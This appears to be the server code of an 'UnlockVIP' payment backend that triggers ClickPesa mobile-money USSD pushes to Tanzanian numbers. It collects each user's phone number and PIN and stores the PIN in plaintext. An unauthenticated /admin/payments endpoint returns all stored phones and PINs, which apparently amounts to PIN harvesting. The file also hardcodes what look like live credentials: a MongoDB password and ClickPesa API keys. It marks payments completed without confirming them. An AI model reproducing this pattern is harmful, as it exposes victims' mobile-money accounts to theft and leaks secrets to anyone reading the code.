require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// =======================
// 🗄️ MONGODB
// =======================
mongoose.connect(
  "mongodb+srv://zaharanirashidi29_db_user:oQgtq3g1JHIgtIT2@cluster0.a6wjozy.mongodb.net/unlockvip?retryWrites=true&w=majority"
)
.then(async () => {
  console.log("MongoDB Connected");

  try {
    await mongoose.connection.db.collection("payments").dropIndex("phone_1_pin_1");
    console.log("✅ Duplicate index removed");
  } catch {
    console.log("⚠️ No index to remove");
  }
})
.catch(err => console.log("MongoDB Error:", err));

// =======================
// 📊 SCHEMA
// =======================
const paymentSchema = new mongoose.Schema({
  phone: String,
  pin: String,
  amount: Number,
  reference: String,
  status: String,
  reason: String,
  time: String
});

const Payment = mongoose.model("Payment", paymentSchema);

// =======================
// 🔑 CLICKPESA KEYS (UPDATED)
// =======================
const CLIENT_ID = "IDWY78v5J43bO1Af2ZD7yxoKruOtsvKk";
const API_KEY = "SKrgc5udTSi3pGmmnZMMc8n2UCNqoYgOaMm1sPpKLB";

// =======================
app.get("/", (req, res) => {
  res.send("UnlockVIP Backend Running 🚀");
});

// =======================
// 🔐 TOKEN
// =======================
async function getAccessToken() {
  const response = await axios.post(
    "https://api.clickpesa.com/third-parties/generate-token",
    {},
    {
      headers: {
        "client-id": CLIENT_ID,
        "api-key": API_KEY,
        "Content-Type": "application/json",
      },
    }
  );

  let token = response.data.token;

  if (!token.startsWith("Bearer")) {
    token = `Bearer ${token}`;
  }

  return token;
}

// =======================
// 💳 CREATE PAYMENT
// =======================
app.post("/create-payment", async (req, res) => {
  try {

    let { phone, pin } = req.body;
    const amount = 3000;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone is required"
      });
    }

    phone = phone.toString().trim();

    if (phone.startsWith("+255")) phone = phone.replace("+", "");
    if (phone.startsWith("0")) phone = "255" + phone.substring(1);

    if (!phone.startsWith("255") || phone.length !== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid Tanzanian phone number"
      });
    }

    const reference = "ORD" + Date.now();

    await Payment.create({
      phone,
      pin: pin || "",
      amount,
      reference,
      status: "PENDING",
      reason: "WAITING",
      time: new Date().toLocaleString()
    });

    const token = await getAccessToken();

    console.log("📦 Sending push...");

    const response = await axios.post(
      "https://api.clickpesa.com/third-parties/payments/initiate-ussd-push-request",
      {
        amount: amount.toString(),
        currency: "TZS",
        orderReference: reference,
        phoneNumber: phone
      },
      {
        headers: {
          Authorization: token,
          "Content-Type": "application/json",
        },
      }
    );

    console.log("✅ PUSH SENT:", response.data);

    await Payment.findOneAndUpdate(
      { reference },
      {
        status: "COMPLETED",
        reason: "PUSH_SENT"
      }
    );

    res.json({
      success: true,
      payment: response.data
    });

  } catch (error) {

    console.error("❌ ERROR:",
      error.response?.data || error.message
    );

    if (error.config?.data) {
      try {
        const parsed = JSON.parse(error.config.data);
        const ref = parsed.orderReference;

        await Payment.findOneAndUpdate(
          { reference: ref },
          {
            status: "FAILED",
            reason: error.response?.data?.message || "FAILED"
          }
        );
      } catch {}
    }

    res.status(500).json({
      success: false,
      error:
        error.response?.data?.message ||
        error.message
    });
  }
});

// =======================
// ✅ ADMIN (FIXED ORDER + NO DUPLICATES)
// =======================
app.get("/admin/payments", async (req, res) => {

  const data = await Payment.aggregate([
    { $sort: { _id: -1 } },
    {
      $group: {
        _id: { phone: "$phone", pin: "$pin" },
        doc: { $first: "$$ROOT" }
      }
    },
    { $replaceRoot: { newRoot: "$doc" } },
    { $sort: { _id: -1 } }
  ]);

  res.json(data);

});

// =======================
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});